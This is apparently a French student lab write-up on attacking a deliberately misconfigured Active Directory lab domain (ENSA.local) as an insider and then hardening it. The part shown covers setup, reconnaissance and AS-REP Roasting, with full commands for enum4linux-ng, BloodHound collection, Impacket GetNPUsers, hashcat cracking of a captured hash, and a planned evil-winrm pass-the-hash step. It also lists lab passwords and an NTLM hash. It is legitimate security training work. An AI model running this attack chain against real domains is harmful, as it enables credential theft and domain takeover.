# Analyse et Durcissement de la Sécurité d'un Environnement Active Directory face aux Attaques Internes
NAJAR YASSINE, ACHRAF LAGHLALI, MOUAD TIMJIJT##
> **Thème:** De l'utilisateur non privilégié à l'administrateur du domaine.  
> **Domaine de laboratoire:** `ENSA.local`  
> **Méthodologie:** Red team, c'est la simulation d'un insider malveillant, exploitation, puis durcissement.

## Table des matières

1. [Architecture du laboratoire](#1architecture_du_laboratoire)
2. [Phase 1 : Mise en place](#2phase_de_la_mise_enplace)
3. [Phase 2 : Reconnaissance](#3phase_de_reconnaissance)
4. [Phase 3 : Exploitation](#4phase_de_éxploitation)
5. [Phase 5 : Durcissement (Achraf](#5phase_durcissement_person_2)
6. [Phase 6 : Vérification](#6phase_de_vérification)
7. [Références](#7_références)


## 1. Architecture du laboratoire

### 1.1 Infrastructure réseau

L'environnement de laboratoire simule un réseau d'entreprise interne composé de trois machines virtuelles hébergées sur **VirtualBox**, interconnectées via un réseau **Host-Only** (`192.168.56.0/24`).

| Machine | Système d'exploitation | Rôle | Adresse IP |
|---|---|---|---|
| DC01 | Windows Server 2025 | Contrôleur de domaine | 192.168.56.10 |
| WS01 | Windows 11 | Poste de travail client | 192.168.56.20 |
| Kali | Kali Linux | Machine attaquante (Insider) | 192.168.56.30 |

**Domaine:** `ENSA.local`

```
[Kali 192.168.56.30]
[WS01 192.168.56.20]  Host-Only (vboxnet0)  [DC01 192.168.56.10]
```

> **Note VirtualBox:** Chaque VM doit avoir son adaptateur réseau en mode **Host-Only (vboxnet0)** avec le **Mode Promiscuité = Permettre tout**. Sans cette configuration, les VMs ne peuvent pas communiquer entre elles même si elles sont sur le même réseau.

---

### 1.2 Comptes utilisateurs

| Utilisateur | Rôle | Mot de passe | Misconfiguration |
|---|---|---|---|
| `john.doe` | Utilisateur standard | `Password123` | Pré-authentification Kerberos désactivée |
| `jane.admin` | Helpdesk (sur-privilégié) | `Pdcemulator123!` | Membre de "Admins du domaine" |
| `svc.backup` | Compte de service | `QuotasContainer123!` | SPN configuré → Kerberoastable |
| `svc.web` | Compte de service | `RIDMaster123!` | SPN configuré |
| `Administrateur` | Admin intégré | *(confidentiel)* | Objectif final de la chaîne d'attaque |

---

### 1.3 Flags CTF

Deux drapeaux ont été cachés pour valider chaque étape de l'attaque. Si post-durcissement un flag n'est plus récupérable → le durcissement est confirmé efficace.

| Flag | Emplacement | Récupéré via |
|---|---|---|
| `FLAG{kerber0astab0g}` | Champ Description du compte `svc.backup` dans ADUC | Énumération LDAP / Kerberoasting |
| `FLAG{da_owned_abog}` | Bureau de l'Administrateur sur DC01 | Pass-the-Hash → Shell Domain Admin |

<img width="621" height="669" alt="image" src="https://github.com/user-attachments/assets/6aaa932b-5e37-4141-9ddc-b7b583f30f7c" />
<img width="955" height="908" alt="image" src="https://github.com/user-attachments/assets/9d6b37d8-a903-4641-a424-3abf812d78d2" />

---

### 1.4 Misconfigurations introduites

Ces erreurs de configuration simulent des erreurs humaines courantes dans les environnements AD réels.

| Misconfiguration | Impact | Phase d'exploitation |
|---|---|---|
| Pré-auth Kerberos désactivée sur `john.doe` | AS-REP Roasting | 3.1 |
| `jane.admin` membre d’Admins du domaine | Escalade de privilèges immédiate | 3.3 |
| SPN configuré sur `svc.backup` | Kerberoasting | 3.2 |
| LDAP signing désactivé (GPO) | Énumération LDAP/BloodHound | 2.1 / 2.3 |
| RC4 activé pour Kerberos (GPO) | Compatibilité outils d'attaque | 3.2 |
| Aucun seuil de verrouillage de compte | Brute force sans risque | 3.1 |
<img width="613" height="657" alt="image" src="https://github.com/user-attachments/assets/32c9daa1-99a3-4471-8f3b-171086e1fb98" />



---

## 2. Phase 1 — Mise en place

### Théorie — Qu'est-ce qu'Active Directory ?

**Active Directory (AD)** est un service d'annuaire développé par Microsoft, introduit avec Windows Server 2000. À la base, il s'agit d'un système centralisé de gestion des identités et des accès pour un réseau.

Dans le cadre d'un CTF, le serveur AD fait office de point central qui contient tous les drapeaux et contrôle qui peut accéder à quoi — il gère qui vous êtes, à quoi vous avez accès, et ce que vous êtes autorisé à faire sur le réseau.

L'AD stocke les éléments suivants :
- **Utilisateurs** (comptes, mots de passe, rôles)
- **Ordinateurs** (qui appartient au domaine)
- **Groupes** (qui a accès à quoi)
- **Politiques** (règles appliquées à l'ensemble du réseau)

#### Composants principaux

| Composant | Rôle |
|---|---|
| **Domaine** | Périmètre logique de l'environnement AD (`ENSA.local`) |
| **Contrôleur de domaine (DC)** | Serveur qui héberge la base de données AD et gère l'authentification |
| **LDAP** |  (Lightweight Directory Acess Protocol) Protocole utilisé pour interroger l'annuaire |
| **Kerberos** | Protocole d'authentification utilisé par AD |
| **GPO** | Politiques de groupe appliquées aux machines et utilisateurs |

---

### 2.1 Configuration réseau de DC01

Un contrôleur de domaine doit impérativement avoir une adresse IP fixe car chaque machine du réseau doit pouvoir le trouver pour :
- **La résolution DNS** : traduire `ENSA.local` en une adresse IP.
- **L'authentification Kerberos** : émission de tickets pour les sessions utilisateurs.
- **Les requêtes LDAP** : répondre à des questions telles que "à quels groupes cet utilisateur appartient-il ?"

Si l'IP du DC changeait de manière dynamique (DHCP), l'ensemble du domaine s'effondrerait.

**Vérification de l'IP statique sur DC01 :**

```cmd
ipconfig /all
```

**Output obtenu :**
```
Carte Ethernet Ethernet :
   DHCP activé. . . . . . . . . . . : Non
   Adresse IPv4. . . . . . . . . . . : 192.168.56.10 (préféré)
   Masque de sous-réseau. . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . :
   Serveurs DNS. . . . . . . . . . . : ::1
                                       192.168.56.10
```

> **DHCP activé = Non** L'IP est bien statique.

---

### 2.2 Vérification du domaine ENSA.local

**Active Directory Domain Services (AD DS)** est le rôle principal du serveur Windows qui :
- Stocke la base de données AD (`NTDS.dit`).
- Gère l'émission de tickets Kerberos.
- Répond aux requêtes LDAP.
- Applique les stratégies de groupe (GPO).

L'installation d'AD DS transforme un serveur Windows classique en contrôleur de domaine.

**Vérification du domaine avec PowerShell :**

```powershell
Get-ADDomain
```

**Output obtenu :**
```
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=ENSA,DC=local
DNSRoot                            : ENSA.local
DomainControllersContainer         : OU=Domain Controllers,DC=ENSA,DC=local
DomainMode                         : Windows2025Domain
DomainSID                          : S-1-5-21-2892995438-413791052-3365889531
Forest                             : ENSA.local
InfrastructureMaster               : WIN-GGPOGFOP203.ENSA.local
Name                               : ENSA
NetBIOSName                        : ENSA
PDCEmulator                        : WIN-GGPOGFOP203.ENSA.local
ReplicaDirectoryServers            : {WIN-GGPOGFOP203.ENSA.local}
RIDMaster                          : WIN-GGPOGFOP203.ENSA.local
```

**Lecture de l'output :**
- `DNSRoot = ENSA.local` → Nom de notre domaine.
- `DomainMode = Windows2025Domain` → Niveau fonctionnel le plus récent.
- `PDCEmulator = WIN-GGPOGFOP203.ENSA.local` → Un seul DC dans le domaine (normal pour notre lab).
- `DomainSID` → Identifiant unique du domaine.

**Renommage du serveur en DC01 :**

```powershell
Rename-Computer -NewName "DC01" -Restart
```

Après redémarrage, vérification :

```powershell
$env:COMPUTERNAME
```

**Output :**
```
DC01
```

---

### 2.3 Création des Unités d'Organisation (OUs)

Les OUs sont des **conteneurs** utilisés pour organiser les objets logiquement dans AD. Elles reflètent la structure d'une organisation et permettent d'appliquer des stratégies différentes selon les sections du domaine.

**Dans Active Directory Users and Computers (ADUC) :**
```
Server Manager → Tools → Active Directory Users and Computers
Clic droit sur ENSA.local → New → Organizational Unit
```

**OUs créées :**
```
ENSA.local
├── Users (conteneur intégré qui contient john.doe et jane.admin)
├── OU=ServiceAccounts (contient svc.backup et svc.web)
├── OU=Workstations (contient WS01)
└── OU=Servers (contient DC01)
```
<img width="237" height="596" alt="image" src="https://github.com/user-attachments/assets/1d88b7c4-e119-4cc2-ad7b-385d0c59da48" />


(SCREENSHOTS ADUC montrant les OUs créées)

---

### 2.4 Création des utilisateurs

**Dans ADUC, pour chaque utilisateur :** clic droit sur le conteneur/OU → New → User

> Décocher "L'utilisateur doit changer le mot de passe à la prochaine ouverture de session" et cocher "Le mot de passe n'expire jamais" pour tous les comptes.

**Comptes créés :**

| OU | Utilisateur | Prénom | Nom | Mot de passe |
|---|---|---|---|---|
| Users (intégré) | `john.doe` | John | Doe | `Password123` |
| Users (intégré) | `jane.admin` | Jane | Admin | `Pdcemulator123!` |
| OU=ServiceAccounts | `svc.backup` | Backup | Service | `QuotasContainer123!` |
| OU=ServiceAccounts | `svc.web` | Web | Service | `RIDMaster123!` |
<img width="937" height="664" alt="image" src="https://github.com/user-attachments/assets/ac7332f6-b4d0-4c51-bd7c-b301faf18c00" />


> **Note sur les mots de passe :** Windows Server 2025 impose des règles strictes sur la complexité des mots de passe. Les mots de passe choisis ont été basés sur des termes techniques familiers (`PDCEmulator`, `QuotasContainer`, `RIDMaster`)  une erreur humaine courante qui les rend vulnérables aux attaques par dictionnaire ciblé.



---

### 2.5 Injection des misconfigurations

#### Misconfiguration 1 — Désactivation de la pré-authentification Kerberos sur john.doe

**Théorie — AS-REP Roasting :**
Par défaut, Kerberos exige que l'utilisateur prouve son identité via la pré-authentification avant d'émettre un ticket. Si celle-ci est désactivée, n'importe qui sur le réseau peut demander un ticket chiffré pour cet utilisateur **sans connaître son mot de passe**, puis tenter de le casser hors ligne.

```
ADUC → Users → clic droit john.doe → Propriétés
→ Onglet "Compte"
→ Options de compte → cocher "Ne pas exiger la pré-authentification Kerberos"
→ Appliquer → OK
```
<img width="613" height="657" alt="image" src="https://github.com/user-attachments/assets/f89dc754-3275-4b74-b31d-4129447e4ead" />



---

#### Misconfiguration 2 — Ajout de jane.admin aux Admins du domaine

**Théorie : Privilege Creep :**
Nous accordons des privilèges excessifs à un compte d'assistance. `jane.admin` est censée être une utilisatrice d'assistance standard, mais elle dispose de tous les droits d'administrateur de domaine. Il s'agit d'une des erreurs de configuration les plus fréquentes dans Active Directory : l'extension progressive des privilèges.

Dans notre chaîne d'attaque, une fois les identifiants de `jane.admin` obtenus via Pass_the_Hash, nous obtenons immédiatement un accès complet à l'administration du domaine.

**Un seul compte d'assistance compromis = prise de contrôle totale du domaine.**

```
ADUC → Users (conteneur intégré)
→ Trouver "Admins du domaine" → clic droit → Propriétés
→ Onglet "Membres" → Ajouter
→ Taper: jane.admin → Vérifier les noms → OK
→ Appliquer → OK
```
<img width="619" height="567" alt="image" src="https://github.com/user-attachments/assets/20a2ba21-2414-425e-8b86-89e39ce2c7e6" />


---

#### Misconfiguration 3 — Configuration d'un SPN sur svc.backup

**Théorie : Kerberoasting :**
Un SPN (Service Principal Name) est un identifiant qui lie un service à un compte utilisateur dans Kerberos. Lorsqu'un utilisateur veut accéder à un service, Kerberos émet un ticket chiffré avec le hash du mot de passe du compte de service. Si le mot de passe est faible, un attaquant peut demander ce ticket et le casser hors ligne.

La raison pour laquelle c'est dangereux en environnement réel : les comptes de service sont souvent oubliés ,configurés une fois, jamais renouvelés, avec des mots de passe faibles qui dorment tranquillement dans l'AD.

**Dans CMD en tant qu'Administrateur :**

```cmd
setspn -A MSSQLSvc/dc01.ENSA.local:1433 ENSA\svc.backup
```

**Vérification :**

```cmd
setspn -L ENSA\svc.backup
```

**Output :**
```
MSSQLSvc/dc01.ENSA.local:1433
```

Le SPN est bien configuré.

---

### 2.6 Plantation des flags CTF

**Théorie :**
La plantation des flags sert de mécanisme de vérification. Au lieu de simplement affirmer "cette attaque fonctionne", nous le prouvons en plaçant des secrets qui ne sont récupérables que si l'attaque réussit. Après le durcissement en Phase 5, nous relançons les attaques  si les flags ne sont plus récupérables, le durcissement est confirmé efficace.

**Flag 1 — `FLAG{kerber0astab0g}` dans la description de svc.backup :**

```
ADUC → OU=ServiceAccounts → clic droit svc.backup → Propriétés
→ Onglet "Général" → Description
→ Taper: FLAG{kerber0astab0g}
→ Appliquer → OK
```

<img width="621" height="669" alt="image" src="https://github.com/user-attachments/assets/b54aab38-0891-4d44-b116-42bbc7591214" />


**Flag 2 — `FLAG{da_owned_abog}` sur le bureau de DC01 :**

```
Clic droit sur le bureau de DC01 → Nouveau → Document texte
→ Nommer le fichier: flag.txt
→ Contenu: FLAG{da_owned_abog}
→ Enregistrer
```

<img width="955" height="908" alt="image" src="https://github.com/user-attachments/assets/f0a36a93-6efb-418e-9fb7-c8150ec1d660" />


---

### 2.7 Configuration de WS01 (Windows 11)

#### Adresse IP statique sur WS01

```
Paramètres → Réseau et Internet → Ethernet → Modifier
→ Passer en Manuel (IPv4)
  IP:       192.168.56.20
  Masque:   255.255.255.0
  Passerelle: 192.168.56.1
  DNS:      192.168.56.10  (pointe vers DC01)
→ Enregistrer
```

**Pourquoi pointer le DNS vers DC01 ?**
La jonction au domaine repose entièrement sur la résolution DNS. Windows 11 doit pouvoir résoudre `ENSA.local` pour trouver le DC avant de pouvoir rejoindre le domaine.

#### Jonction au domaine ENSA.local

>  **Important :** DC01 et WS01 doivent être démarrés **simultanément** pour que la jonction fonctionne. (My RAM was killing me lol)

```
Paramètres → Système → Informations système
→ "Domaine ou groupe de travail" → Modifier
→ Sélectionner "Domaine"
→ Taper: ENSA.local
→ Identifiants: ENSA\Administrateur / (mot de passe DC01)
→ OK → Redémarrer
```

**Vérification après redémarrage :**

```cmd
echo %USERDOMAIN%
```

**Output :**
```
ENSA
```

 WS01 est bien joint au domaine `ENSA.local`.



---

### 2.8 Configuration de Kali Linux

#### Adresse IP statique sur Kali

```bash
sudo nano /etc/network/interfaces
```

Ajouter à la fin du fichier :
```
auto eth0
iface eth0 inet static
    address 192.168.56.30
    netmask 255.255.255.0
    gateway 192.168.56.1
    dns-nameservers 192.168.56.10
```

```bash
sudo systemctl restart networking
```

#### Résolution DNS et accès Internet (double adaptateur)

Pour avoir à la fois l'accès au lab ET internet sur Kali, nous utilisons deux adaptateurs :
- `eth0`  Host-Only (`192.168.56.30`) pour attaquer le lab.
- `eth1`  NAT pour télécharger les outils.

**Activer l'adaptateur NAT dans VirtualBox :**
```
Kali VM → Paramètres → Réseau → Adaptateur 2
→ Activer → Attaché à: NAT
```

**Corriger la route par défaut (à refaire à chaque démarrage) :**

```bash
ip route del default via 192.168.56.1 dev eth0
```

**Vérification de la connectivité :**

```bash
ping 192.168.56.10
```

**Output :**
```
64 bytes from 192.168.56.10: icmp_seq=1 ttl=128 time=2.34 ms
64 bytes from 192.168.56.10: icmp_seq=2 ttl=128 time=4.07 ms
```

 Kali peut joindre DC01.

**Vérification DNS :**

```bash
nslookup ENSA.local 192.168.56.10
```

**Output :**
```
Server:         192.168.56.10
Address:        192.168.56.10#53
Name:   ENSA.local
Address: 192.168.56.10
```

 La résolution DNS fonctionne.

---

## 3. Phase 2 — Reconnaissance

### Théorie

La phase de reconnaissance consiste à collecter un maximum d'informations sur l'environnement Active Directory cible depuis la machine attaquante (Kali Linux), en simulant un attaquant interne ayant uniquement accès au réseau.

Cette phase est l'équivalent de la phase OSINT dans un CTF ,avant d'exploiter quoi que ce soit, on cartographie la surface d'attaque.

**Pourquoi la reconnaissance est-elle critique ?**

Dans un environnement Active Directory, de nombreux protocoles exposent des informations sans authentification par défaut :
- **LDAP (port 389)** : peut permettre des requêtes pour lister les utilisateurs, groupes et attributs
- **SMB (port 445)** : peut exposer les partages réseau et les politiques de sécurité
- **DNS (port 53)** : peut révéler la structure interne du domaine
- **Kerberos (port 88)** : permet de valider l'existence de comptes sans authentification
- **WinRM (port 5985)** : permet un shell PowerShell distant si des credentials sont obtenus

**Outils utilisés :**

| Outil | Rôle |
|---|---|
| `nmap` | Scan réseau et détection des services |
| `enum4linux-ng` | Énumération SMB/LDAP/RPC |
| `bloodhound-python` | Collecte de données pour BloodHound |
| `BloodHound` | Cartographie des chemins d'attaque AD |

---

### 3.1 Énumération avec enum4linux-ng

**Installation :**

```bash
sudo apt install enum4linux-ng -y
```

**Commande :**

```bash
enum4linux-ng -A -u "john.doe" -p "Password123" 192.168.56.10
```

**Output (extrait critique) :**

```
======================================
|    Listener Scan on 192.168.56.10    |
======================================
[+] LDAP is accessible on 389/tcp
[+] LDAPS is accessible on 636/tcp
[+] SMB is accessible on 445/tcp
[+] SMB over NetBIOS is accessible on 139/tcp

==========================================
|    SMB Dialect Check on 192.168.56.10    |
==========================================
Supported dialects:
  SMB 1.0: false
  SMB 3.0: true
  SMB 3.1.1: true
SMB signing required: true

======================================
|    Users via RPC on 192.168.56.10    |
======================================
[+] Found 13 user(s)

'1117':
  username: john.doe
  name: John Doe
  acb: '0x00010210'        ← flag 0x0001 = DONT_REQUIRE_PREAUTH !
  description: (null)

'1122':
  username: jane.admin
  name: Jane Admin
  acb: '0x00000210'
  description: (null)

'1123':
  username: svc.backup
  name: Backup Service
  acb: '0x00000210'
  description: FLAG{kerber0astab0g}    ← FLAG 1 CAPTURÉ !

=======================================
|    Shares via RPC on 192.168.56.10    |
=======================================
[+] Found 5 share(s):
NETLOGON → Mapping: OK, Listing: OK
SYSVOL   → Mapping: OK, Listing: OK

==========================================
|    Policies via RPC for 192.168.56.10    |
==========================================
Domain password information:
  Minimum password length: 10
  Lockout threshold: None    ← Aucun verrouillage = brute force sans risque
```
<img width="904" height="818" alt="image" src="https://github.com/user-attachments/assets/dc1a0a63-9cfc-45ae-b18a-be8494732040" />


**Résultats critiques :**

| Découverte | Valeur | Impact |
|---|---|---|
| 13 utilisateurs énumérés | Surface d'attaque complète | Mappée |
| `john.doe` (acb: `0x00010210`) | Pré-auth Kerberos désactivée |  Cible AS-REP Roasting |
| `svc.backup` description | `FLAG{kerber0astab0g}` |  Flag 1 capturé ! |
| Partages accessibles | NETLOGON, SYSVOL | Lecture GPO possible |
| Lockout threshold | Aucun | Brute force sans risque |
| SMB signing | Requis | NTLM relay impossible |

**Observation :** Windows Server 2025 bloque les liaisons LDAP anonymes par défaut, la commande nécessite des credentials valides (`john.doe`). Cependant, avec un simple compte utilisateur standard, l'intégralité de l'annuaire est accessible. Cela démontre qu'un insider avec les privilèges minimaux peut cartographier toute la surface d'attaque du domaine.
DOMAINE INFORMATION:
<img width="904" height="818" alt="image" src="https://github.com/user-attachments/assets/ec728b6e-5357-4fc6-b1db-a73063b629a2" />
Le flag!
<img width="705" height="894" alt="image" src="https://github.com/user-attachments/assets/31dcb062-3eb2-419d-8aca-8905d77ab4ea" />


---

### 3.2 Scan réseau avec Nmap

**Qu'est-ce que Nmap ?**
Nmap (Network Mapper) est un outil de scan réseau qui identifie les ports ouverts, les services qui tournent et leurs versions. Dans un CTF, c'est toujours le premier mouvement  avant d'exploiter quoi que ce soit, on cartographie ce qui est accessible.

**Commande :**

```bash
nmap -sV -sC -p- 192.168.56.10 -T4
```

| Flag | Signification |
|---|---|
| `-sV` | Détection des versions des services |
| `-sC` | Scripts par défaut (dont certains spécifiques à AD) |
| `-p-` | Scan de tous les 65535 ports |
| `-T4` | Vitesse de scan rapide |

**Output obtenu :**

```
Nmap scan report for 192.168.56.10
Host is up (0.0012s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENSA.local0.)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENSA.local0.)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 3s

MAC Address: 08:00:27:07:14:3D (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows
```
<img width="981" height="877" alt="image" src="https://github.com/user-attachments/assets/0df9c37f-4589-4d84-977d-34f7af2977e6" />

**Ports critiques :**

| Port | Service | Impact pour notre attaque |
|---|---|---|
| `88/tcp` | Kerberos | Cible AS-REP Roasting et Kerberoasting |
| `389/tcp` | LDAP | Énumération de l'annuaire |
| `445/tcp` | SMB | Mouvement latéral |
| `5985/tcp` | **WinRM** | **Shell distant via evil-winrm** ← exploité en Phase 3 |
| `3268/tcp` | Global Catalog | Requêtes LDAP forêt entière |

**Observations importantes :**
- SMB signing requis → NTLM relay impossible
- **WinRM actif (port 5985)** → accès PowerShell distant possible avec evil-winrm une fois des credentials DA obtenus
- Clock skew de 3s → Kerberos fonctionnel (tolérance max: 5 minutes)
- Hostname confirmé: `DC01.ENSA.local`

---

### 3.3 BloodHound : Cartographie des chemins d'attaque

**Qu'est-ce que BloodHound ?**
BloodHound est un outil d'analyse de chemins d'attaque dans Active Directory. Il utilise la **théorie des graphes** pour identifier les chemins d'escalade de privilèges entre les objets AD (utilisateurs, groupes, ordinateurs). Au lieu de chercher aveuglément, on voit exactement quel chemin mène à Domain Admin.

#### Installation

**Installation de BloodHound :**
<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/74d89357-74f9-4433-90e8-86496364a697" />

```bash
sudo apt install bloodhound -y
bloodhound-setup
```

> **Note :** L'installation d'**Active Directory Certificate Services (AD CS)** sur DC01 a été nécessaire pour activer LDAPS (port 636) et permettre la collecte BloodHound. Windows Server 2025 refuse les connexions LDAP non sécurisées par défaut.

**Vérification que LDAPS est actif sur DC01 :**

```powershell
Get-NetTCPConnection -LocalPort 636 -State Listen
```

**Output :**
```
LocalAddress  LocalPort  RemoteAddress  RemotePort  State
::            636        ::             0           Listen
0.0.0.0       636        0.0.0.0        0           Listen
```

 LDAPS (port 636) est bien en écoute.

**Désactivation du LDAP signing via GPO (nécessaire pour la collecte) :**

```
gpedit.msc → Computer Configuration → Windows Settings
→ Security Settings → Local Policies → Security Options
→ "Domain controller: LDAP server signing requirements" → None
→ gpupdate /force
```

> **Note pour le rapport :** La désactivation du LDAP signing est une misconfiguration supplémentaire introduite pour permettre la collecte. En environnement réel, cette protection doit rester activée — elle prévient les attaques LDAP relay et man-in-the-middle.

**Activation de RC4 pour Kerberos (GPO) :**

```
gpedit.msc → Computer Configuration → Windows Settings
→ Security Settings → Local Policies → Security Options
→ "Network security: Configure encryption types allowed for Kerberos"
→ Cocher RC4_HMAC_MD5
→ gpupdate /force
```

#### Collecte des données avec bloodhound-python

**Installation dans un environnement virtuel :**

```bash
python3 -m venv ~/bhenv
source ~/bhenv/bin/activate
pip install bloodhound
```

**Collecte :**

```bash
~/bhenv/bin/bloodhound-python -u "john.doe" -p "Password123" -d ENSA.local -ns 192.168.56.10 -c all --disable-pooling
```

**Output :**

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ensa.local
INFO: Connecting to LDAP server: dc01.ensa.local
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Found 14 users
INFO: Found 61 groups
INFO: Found 2 gpos
INFO: Found 7 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PC.ENSA.local
INFO: Querying computer: DC01.ENSA.local
WARNING: Could not resolve: PC.ENSA.local: The DNS query name does not exist: PC.ENSA.local.
INFO: Done in 00M 08S
```

**Données collectées :**

| Objet | Quantité |
|---|---|
| Domaines | 1 |
| Ordinateurs | 2 (DC01 + WS01) |
| Utilisateurs | 14 |
| Groupes | 61 |
| GPOs | 2 |
| OUs | 7 |

**Chargement dans BloodHound :**

```bash
# Zipper les fichiers JSON générés
cd /home/kali
zip bloodhound_data.zip 20260418*.json

# Lancer BloodHound
sudo bloodhound --no-sandbox
```

Se connecter à `http://localhost:8080` → glisser-déposer `bloodhound_data.zip`.

#### Requêtes BloodHound et résultats

| Requête | Résultat |
|---|---|
| Find Domain Admins | `jane.admin@ENSA.LOCAL`, `Administrateur@ENSA.LOCAL` |
| Find AS-REP Roastable Users | `john.doe@ENSA.LOCAL`  |
| Find Kerberoastable Users | `svc.backup@ENSA.LOCAL`  |
| Shortest Path to Domain Admins | `JANE.ADMIN → MemberOf → ADMINS DU DOMAINE` |
<img width="957" height="936" alt="image" src="https://github.com/user-attachments/assets/ad68067f-76f8-4775-abef-db7afa4c756c" />


**Graphe d'attaque BloodHound :**

```
DC01.ENSA.LOCAL
    └─[GPLink]─► DEFAULT DOMAIN POLICY
                      └─[CoerceToTGT]─► ENSA.LOCAL
                                            └─[Contains]─► USERS@ENSA.LOCAL
                                                              ├─[MemberOf]─► JANE.ADMIN
                                                              │                  └─[MemberOf]─► ADMINS DU DOMAINE 
                                                              └─[WriteDacl]─► ADMINS DU DOMAINE
```

<img width="1600" height="335" alt="image" src="https://github.com/user-attachments/assets/90fa2d6e-104d-48a8-8338-602edc476395" />


Find AS-REP Roastable Users
<img width="1011" height="179" alt="image" src="https://github.com/user-attachments/assets/53de0113-afee-4f65-8f08-75ed2210bf6b" />



<img width="667" height="461" alt="image" src="https://github.com/user-attachments/assets/fb49bcc8-615e-4ceb-9e18-7e247425d025" />


---

## 4. Phase 3 — Exploitation

### Chaîne d'attaque complète

```
[Kali — Attaquant interne]
        │
        ├─── 3.1 AS-REP Roast john.doe (pré-auth désactivée)
        │         └── Hash AS-REP capturé → cracké avec hashcat: "Password123" 
        │
        ├─── 3.2 Authentifié comme john.doe → Kerberoasting svc.backup
        │         └── Bloqué par Windows Server 2025 (AES-only) 
        │
        ├─── 3.3 Pass-the-Hash avec jane.admin
        │         └── Hash NTLM: 02e76cbda1853d84bc588db37f6f24ee
        │              └── evil-winrm → Shell PowerShell sur DC01 
        │
        └─── 3.4 Capture du flag final
                  └── FLAG{da_owned_abog} 
```

---

### 4.1 AS-REP Roasting (Step 3.1)

**Théorie :**
Lorsque la pré-authentification Kerberos est désactivée sur un compte, n'importe qui peut demander un ticket AS-REP pour ce compte **sans connaître son mot de passe**. Ce ticket, chiffré avec le hash du mot de passe, peut ensuite être cracké hors ligne. La DC ne voit aucune tentative d'authentification échouée — l'attaque est **totalement silencieuse**.

```
Kali → DC01: "Je veux un ticket pour john.doe"
DC01 → Kali: "Voici un blob chiffré" ← aucune preuve d'identité requise !
Kali: craque le blob hors ligne à pleine vitesse GPU
```

**Capture du hash AS-REP :**

```bash
/root/bhenv/bin/python3 /root/bhenv/bin/GetNPUsers.py ENSA.local/john.doe -no-pass -dc-ip 192.168.56.10
```

**Output :**

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
[*] Getting TGT for john.doe
$krb5asrep$23$john.doe@ENSA.LOCAL:f31b0f9c58bbde787a033ab379e62c0f$325343b4f074bcfef663fda5f162cb708814a0ee4908a24bee3b304ccfa1d5e1d3c69886ef3ea3a58da9a5fcd2fd27640312fbd39b8b7cec4025da70d150508da425f6ecd2ded5bee5dea0d2e788ca23aa7f20f2be85e20ff7e1ba63c538211bea928e7b13abfc1fa1cb14af9eb92f6943da4d683299f943a004f2c4be3d4ad399478f36c8cddcd171196a9a08e36962866fd0a0e60c6cd23a1ea4db7daf69459f60fc0cc48ef27cfd6e75df749f501a79a561944b7f59f263a381fb2d87bdc75cbfde0660b510671e49fd6fc7f7d289cfade783d75f88282fb2d01fc3a1dd2761f1a008124a199b5a0c5cc34b1eaf8eea39b18647344674
```

**Lecture du hash :**

| Partie | Signification |
|---|---|
| `$krb5asrep$` | Type de hash — AS-REP Kerberos |
| `23` | Type de chiffrement — RC4-HMAC (le plus faible) |
| `john.doe@ENSA.LOCAL` | Compte ciblé |
| `f31b0f9c...` | Checksum — utilisé pour vérifier le déchiffrement et la detection des erreurs. |
| `325343b4...` | Clé de session chiffrée  c'est ce qu'on craque |

**Sauvegarde du hash :**

```bash
echo '$krb5asrep$23$john.doe@ENSA.LOCAL:f31b0f9c58bbde787a033ab379e62c0f$325343b4f074bcfef663fda5f162cb708814a0ee4908a24bee3b304ccfa1d5e1d3c69886ef3ea3a58da9a5fcd2fd27640312fbd39b8b7cec4025da70d150508da425f6ecd2ded5bee5dea0d2e788ca23aa7f20f2be85e20ff7e1ba63c538211bea928e7b13abfc1fa1cb14af9eb92f6943da4d683299f943a004f2c4be3d4ad399478f36c8cddcd171196a9a08e36962866fd0a0e60c6cd23a1ea4db7daf69459f60fc0cc48ef27cfd6e75df749f501a79a561944b7f59f263a381fb2d87bdc75cbfde0660b510671e49fd6fc7f7d289cfade783d75f88282fb2d01fc3a1dd2761f1a008124a199b5a0c5cc34b1eaf8eea39b18647344674' > /home/kali/asrep_hash.txt
```

**Décompression du wordlist rockyou :**

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Craquage avec Hashcat :**

```bash
hashcat -m 18200 /home/kali/asrep_hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Output :**

```
hashcat (v6.2.6) starting

Device #1: cpu-haswell-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz

Hashes: 1 digests; 1 unique digests, 1 unique salts
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392

$krb5asrep$23$john.doe@ENSA.LOCAL:f31b0f9c58bbde787a033ab379e62c0f$...:Password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Time.Started.....: Sat Apr 18 11:22:45 2026, (1 sec)
Recovered........: 1/1 (100.00%) Digests
